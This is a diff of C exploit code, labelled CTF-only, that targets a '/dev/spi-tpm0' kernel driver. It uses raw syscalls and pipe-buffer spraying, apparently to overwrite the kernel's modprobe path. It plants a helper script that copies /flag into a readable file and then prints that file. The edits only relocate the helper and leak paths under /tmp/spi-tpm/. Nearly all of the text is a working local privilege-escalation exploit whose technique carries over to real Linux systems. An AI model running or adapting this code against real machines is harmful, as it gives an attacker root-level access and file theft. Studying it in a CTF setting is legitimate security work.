@@ -1,13 +1,13 @@
 /* SPI TPM pwn CTF-only experiment; prepend raw_probe syscall helpers. */
 static u8 flood[4096],sealed[4096],readback[512];
 static int pipes[8][2];
-static const char helper[]="/tmp/m";
+static const char helper[]="/tmp/spi-tpm/m";
 static void put32(int n,u32 v){for(int i=0;i<4;i++)input[n+i]=v>>(8*i);}
 static void put64(int n,u64 v){for(int i=0;i<8;i++)input[n+i]=v>>(8*i);}
 static void readfile(const char *path){long f=call(56,-100,(long)path,0,0,0,0);if(f<0){logrow(-9,0,f,0,0,0);return;}long n=call(63,f,(long)readback,sizeof(readback)-1,0,0,0);if(n>0)call(64,1,(long)readback,n,0,0,0);call(57,f,0,0,0,0,0);}
 int main(void){
  say("PWN_LOCAL_ATTEMPT\n");u64 mask=1;call(122,0,8,(long)&mask,0,0,0);
- const char script[]="#!/bin/sh\n/bin/cat /flag > /tmp/leak\n/bin/chmod 0644 /tmp/leak\n";
+ const char script[]="#!/bin/sh\n/bin/cat /flag > /tmp/spi-tpm/leak\n/bin/chmod 0644 /tmp/spi-tpm/leak\n";
  long hf=call(56,-100,(long)helper,0x241,0755,0,0);if(hf<0){logrow(-8,0,hf,0,0,0);return 1;}call(64,hf,(long)script,sizeof(script)-1,0,0,0);call(57,hf,0,0,0,0,0);
  say("MODPROBE_BEFORE\n");readfile("/proc/sys/kernel/modprobe");
  int fd=call(56,-100,(long)"/dev/spi-tpm0",2,0,0,0);struct gen g;fill(&g,0,sizeof(g));long r=call(29,fd,0xc0184301UL,(long)&g,0,0,0);if(r||g.status)return 2;
@@ -34,7 +34,7 @@ int main(void){
        if(q==0 && avail==51*4096){
          say("CONTROLLED_PIPE_RING\n");long wr=call(64,pipes[k][1],(long)helper,sizeof(helper),0,0,0);logrow(-5,k,wr,0,0,0);
          say("MODPROBE_AFTER\n");readfile("/proc/sys/kernel/modprobe");int disc=13;long tr=call(29,0,0x5423,(long)&disc,0,0,0);logrow(-6,0,tr,0,0,0);
-         say("FLAG_RESULT_BEGIN\n");readfile("/tmp/leak");say("\nFLAG_RESULT_END\n");
+         say("FLAG_RESULT_BEGIN\n");readfile("/tmp/spi-tpm/leak");say("\nFLAG_RESULT_END\n");
        }
      }
      say("PROBE_COMPLETE\n");for(;;){long t[2]={1,0};call(101,(long)t,0,0,0,0,0);}
